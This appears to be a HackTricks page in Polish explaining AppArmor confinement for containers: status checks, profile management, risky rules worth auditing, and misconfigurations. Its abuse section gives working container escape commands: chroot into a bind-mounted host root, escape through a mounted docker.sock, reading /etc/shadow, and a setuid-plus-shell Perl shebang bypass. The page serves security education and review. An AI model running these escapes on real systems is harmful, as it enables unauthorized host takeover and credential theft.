# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system kontroli dostępu typu Mandatory Access Control, który nakłada ograniczenia za pomocą profili przypisanych do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, które w dużej mierze zależą od własności użytkownika i grupy, AppArmor pozwala jądru egzekwować politykę przypisaną bezpośrednio do procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, aby spróbować wykonać akcję, a mimo to zostać zablokowany, ponieważ jego profil AppArmor nie zezwala na odpowiednią ścieżkę, mount, zachowanie sieciowe lub użycie capability.

Najważniejszym punktem koncepcyjnym jest to, że AppArmor jest **oparty na ścieżkach (path-based)**. Ocenia dostęp do systemu plików przez reguły ścieżek, a nie przez etykiety tak jak SELinux. To czyni go przystępnym i potężnym, ale także oznacza, że bind mounty i alternatywne układy ścieżek wymagają ostrożnej uwagi. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, efekt polityki może nie być taki, jak operator początkowo oczekiwał.

## Rola w izolacji kontenerów

Przeglądy bezpieczeństwa kontenerów często kończą się na capability i seccomp, ale AppArmor ma znaczenie także po tych kontrolach. Wyobraź sobie kontener, który ma więcej uprawnień niż powinien, lub workload, który potrzebował dodatkowej capability ze względów operacyjnych. AppArmor nadal może ograniczać dostęp do plików, zachowanie mountów, komunikację sieciową i wzorce wykonywania w sposób, który zatrzyma oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor "tylko po to, aby aplikacja działała" może cicho przekształcić jedynie ryzykowną konfigurację w taką, którą można aktywnie wykorzystać.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Aby zobaczyć, pod jakim użytkownikiem uruchomiony jest bieżący proces kontenera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Różnica jest pouczająca. W normalnym przypadku proces powinien pokazywać kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku unconfined ta dodatkowa warstwa ograniczeń znika.

Możesz też sprawdzić, co Docker uważa, że zastosował:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Użycie w czasie wykonywania

Docker może zastosować domyślny lub niestandardowy profil AppArmor, jeśli host to obsługuje. Podman może również zintegrować się z AppArmor na systemach opartych na AppArmor, chociaż na dystrybucjach preferujących SELinux to inne MAC często dominuje. Kubernetes może wystawiać politykę AppArmor na poziomie workloadów na węzłach, które faktycznie obsługują AppArmor. LXC i pokrewne środowiska system-container w rodzinie Ubuntu również szeroko korzystają z AppArmor.

Praktyczny wniosek jest taki, że AppArmor nie jest „funkcją Dockera”. To cecha jądra hosta, którą różne runtime’y mogą zdecydować się zastosować. Jeśli host tego nie obsługuje lub runtime został poinstruowany, by działać unconfined, domniemana ochrona w praktyce nie istnieje.

Dla Kubernetes konkretnie nowoczesne API to `securityContext.appArmorProfile`. Od Kubernetes `v1.30` starsze beta adnotacje AppArmor są przestarzałe. Na wspieranych hostach `RuntimeDefault` jest profilem domyślnym, podczas gdy `Localhost` wskazuje na profil, który musi być już załadowany na węźle. Ma to znaczenie podczas przeglądu, bo manifest może wyglądać na skonfigurowany pod AppArmor, a jednocześnie polegać całkowicie na wsparciu po stronie węzła i wstępnie załadowanych profilach.

Jedną subtelną, ale użyteczną operacyjną wskazówką jest to, że jawne ustawienie `appArmorProfile.type: RuntimeDefault` jest bardziej restrykcyjne niż po prostu pominięcie pola. Jeśli pole jest jawnie ustawione, a węzeł nie obsługuje AppArmor, przyjęcie powinno się nie powieść. Jeśli pole jest pominięte, workload może nadal uruchomić się na węźle bez AppArmor i po prostu nie otrzymać tej dodatkowej warstwy ograniczeń. Z punktu widzenia atakującego to dobry powód, by sprawdzić zarówno manifest, jak i rzeczywisty stan węzła.

Na hostach z obsługą AppArmor używanych przez Docker najlepiej znanym profilem domyślnym jest `docker-default`. Ten profil jest generowany z Moby's AppArmor template i jest ważny, ponieważ wyjaśnia, dlaczego niektóre PoCs oparte na capability wciąż zawodzą w domyślnym kontenerze. W szerokich zarysach `docker-default` pozwala na zwykłe operacje sieciowe, odmawia zapisów do dużej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje mount i ogranicza ptrace, tak by nie był ogólnym narzędziem do sondowania hosta. Zrozumienie tej podstawy pomaga rozróżnić „kontener ma `CAP_SYS_ADMIN`” od „kontener faktycznie może użyć tej capability przeciwko interfejsom jądra, które mnie interesują”.

## Zarządzanie profilami

AppArmor profiles są zazwyczaj przechowywane pod `/etc/apparmor.d/`. Powszechną konwencją nazewnictwa jest zastępowanie slashes w ścieżce wykonywalnej kropkami. Na przykład profil dla `/usr/bin/man` jest zwykle przechowywany jako `/etc/apparmor.d/usr.bin.man`. Ta szczegółowa informacja ma znaczenie zarówno przy obronie, jak i ocenie, ponieważ gdy znasz aktywną nazwę profilu, często możesz szybko zlokalizować odpowiadający plik na hoście.

Przydatne polecenia do zarządzania po stronie hosta obejmują:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Powód, dla którego te polecenia mają znaczenie w odniesieniu do container-security, jest taki, że wyjaśniają, jak profile są faktycznie tworzone, ładowane, przełączane na complain mode i modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przełączać profile do complain mode podczas rozwiązywania problemów i zapomina przywrócić enforcement, kontener może wyglądać na chroniony w dokumentacji, podczas gdy w rzeczywistości zachowuje się znacznie luźniej.

### Budowanie i aktualizacja profili

`aa-genprof` może obserwować zachowanie aplikacji i pomóc w interaktywnym wygenerowaniu profilu:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` może wygenerować szablon profilu, który później można wczytać za pomocą `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Gdy plik binarny się zmienia i polityka wymaga aktualizacji, `aa-logprof` może odtworzyć denials znalezione w logach i pomóc operatorowi zdecydować, czy allow czy deny je:
```bash
sudo aa-logprof
```
### Dzienniki

Odmowy AppArmor są często widoczne w `auditd`, w syslogu lub w narzędziach takich jak `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Jest to przydatne operacyjnie i ofensywnie. Obrońcy używają tego do dopracowywania profili. Atakujący używają tego, aby dowiedzieć się, która dokładna ścieżka lub operacja jest odrzucana i czy AppArmor jest mechanizmem blokującym łańcuch eksploitu.

### Identyfikacja dokładnego pliku profilu

Kiedy runtime pokazuje konkretną nazwę profilu AppArmor dla kontenera, często użyteczne jest odwzorowanie tej nazwy do pliku profilu na dysku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Jest to szczególnie przydatne podczas przeglądu po stronie hosta, ponieważ wypełnia lukę między "the container says it is running under profile `lowpriv`" a "the actual rules live in this specific file that can be audited or reloaded".

### Reguły o wysokim znaczeniu do audytu

Kiedy możesz odczytać profil, nie zatrzymuj się na prostych liniach `deny`. Kilka typów reguł znacząco zmienia to, jak użyteczny będzie AppArmor przeciwko próbie container escape:

- `ux` / `Ux`: uruchamia docelowy plik binarny unconfined. Jeśli osiągalny helper, shell lub interpreter jest dozwolony pod `ux`, zwykle jest to pierwsza rzecz do przetestowania.
- `px` / `Px` i `cx` / `Cx`: wykonują przejścia profilu przy exec. Nie są automatycznie złe, ale warto je zaaudytować, ponieważ przejście może trafić do znacznie szerszego profilu niż obecny.
- `change_profile`: pozwala zadaniu przełączyć się na inny załadowany profil, natychmiast lub przy następnym exec. Jeśli docelowy profil jest słabszy, może to stać się zamierzonym kanałem ucieczki z restrykcyjnej domeny.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: powinny zmienić, ile zaufania pokładasz w profilu. `complain` loguje odmowy zamiast ich egzekwowania, `unconfined` usuwa granicę, a `prompt` zależy od ścieżki decyzyjnej w userspace zamiast czystego odmówienia wymuszanego przez kernel.
- `userns` or `userns create,`: nowsza polityka AppArmor może pośredniczyć w tworzeniu user namespaces. Jeśli profil kontenera wyraźnie to pozwala, zagnieżdżone user namespaces pozostają w grze nawet gdy platforma używa AppArmor jako części strategii hardeningu.

Przydatne polecenie grep po stronie hosta:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Tego rodzaju audyt bywa często bardziej użyteczny niż wpatrywanie się w setki zwykłych reguł plików. Jeśli breakout zależy od uruchomienia helpera, wejścia do nowego namespace lub ucieczki do mniej restrykcyjnego profilu, odpowiedź często kryje się w regułach skoncentrowanych na przejściach, a nie w oczywistych linijkach w stylu `deny /etc/shadow r`.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają to podczas debugowania aplikacji, która zawiodła, ponieważ profil poprawnie zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w produkcji, cała warstwa MAC zostaje w praktyce usunięta.

Innym subtelnym problemem jest zakładanie, że bind mounts są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor jest path-based, udostępnianie ścieżek hosta pod alternatywnymi lokalizacjami montowania może źle współdziałać z regułami opartymi na ścieżkach. Trzecim błędem jest zapomnienie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli jądro hosta faktycznie nie egzekwuje AppArmor.

## Nadużycia

Gdy AppArmor zostanie wyłączony, operacje wcześniej ograniczone mogą nagle zacząć działać: czytanie wrażliwych ścieżek przez bind mounts, dostęp do części procfs lub sysfs, które powinny być trudniejsze w użyciu, wykonywanie działań związanych z mount, jeśli capabilities/seccomp także na to pozwalają, lub używanie ścieżek, które profil normalnie by odrzucił. AppArmor często tłumaczy, dlaczego próba breakout oparta na capabilities „powinna działać” na papierze, ale w praktyce zawodzi. Usuń AppArmor, a ta sama próba może zacząć się powieść.

Jeśli podejrzewasz, że AppArmor jest główną przeszkodą dla path-traversal, bind-mount lub mount-based chain nadużyć, pierwszym krokiem zwykle jest porównanie, co staje się dostępne z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz po niej przechodzić i ją odczytać:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Jeśli kontener ma również niebezpieczne uprawnienie takie jak `CAP_SYS_ADMIN`, jednym z najpraktyczniejszych testów jest sprawdzenie, czy AppArmor jest kontrolą blokującą operacje montowania lub dostęp do wrażliwych systemów plików jądra:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
W środowiskach, w których host path jest już dostępny przez bind mount, utrata AppArmor może także przekształcić read-only information-disclosure issue w bezpośredni dostęp do plików hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Cel tych poleceń nie polega na tym, że sam AppArmor tworzy breakout. Chodzi o to, że po usunięciu AppArmor wiele filesystem i mount-based abuse paths staje się od razu testowalnych.

### Pełny przykład: AppArmor wyłączony + root hosta zamontowany

Jeśli kontener ma już host root bind-mounted pod `/host`, usunięcie AppArmor może przekształcić zablokowany filesystem abuse path w kompletny host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Gdy shell wykonuje się przez host filesystem, workload faktycznie uciekł poza container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Pełny przykład: AppArmor wyłączony + Runtime Socket

Jeżeli prawdziwą barierą był AppArmor chroniący runtime state, zamontowany socket może wystarczyć do complete escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dokładna ścieżka zależy od punktu montowania, ale skutek jest ten sam: AppArmor nie blokuje już dostępu do runtime API, a runtime API może uruchomić kontener kompromitujący hosta.

### Full Example: Path-Based Bind-Mount Bypass

Ponieważ AppArmor działa na podstawie ścieżek, ochrona `/proc/**` nie zabezpiecza automatycznie tej samej zawartości hostowego procfs, gdy jest ona dostępna przez inną ścieżkę:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Wpływ zależy od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka również omija inne zabezpieczenia, jednak ten schemat jest jednym z najważniejszych powodów, dla których AppArmor należy oceniać razem z układem punktów montowania, a nie w oderwaniu.

### Pełny przykład: Shebang Bypass

Polityka AppArmor czasami celuje w ścieżkę interpretera w sposób, który nie uwzględnia w pełni wykonywania skryptów przez obsługę shebangu. Historyczny przykład obejmował użycie skryptu, którego pierwsza linia wskazuje na ograniczony interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Taki przykład jest ważny jako przypomnienie, że zamiar profilu i rzeczywista semantyka wykonania mogą się rozjechać. Podczas przeglądu AppArmor w środowiskach kontenerowych, łańcuchy interpreterów i alternatywne ścieżki wykonania zasługują na szczególną uwagę.

## Sprawdzenia

Celem tych sprawdzeń jest szybkie odpowiedzenie na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest ograniczony oraz czy runtime faktycznie zastosował profil do tego kontenera?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Co warto zauważyć:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, workload nie korzysta z izolacji AppArmor.
- Jeśli `aa-status` pokazuje AppArmor wyłączony lub niezaładowany, każda nazwa profilu w konfiguracji runtime jest w dużej mierze kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub nieoczekiwany niestandardowy profil, często to jest powód, dla którego ścieżka nadużycia oparta na systemie plików lub mountach działa.
- Jeśli `/sys/kernel/security/apparmor/profiles` nie zawiera oczekiwanego profilu, sama konfiguracja runtime lub orchestratora nie wystarczy.
- Jeśli rzekomo utwardzony profil zawiera `ux`, szerokie `change_profile`, `userns` lub reguły w stylu `flags=(complain)`, praktyczna granica ochrony może być znacznie słabsza, niż sugeruje nazwa profilu.

Jeśli kontener ma już podniesione uprawnienia z powodów operacyjnych, pozostawienie włączonego AppArmor często decyduje o tym, czy mamy do czynienia z kontrolowanym wyjątkiem, czy znacznie poważniejszą awarią bezpieczeństwa.

## Runtime Defaults

| Runtime / platform | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Dla AppArmor najważniejszą zmienną często jest **host**, a nie tylko runtime. Ustawienie profilu w manifeście nie tworzy ograniczeń na węźle, na którym AppArmor nie jest włączony.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
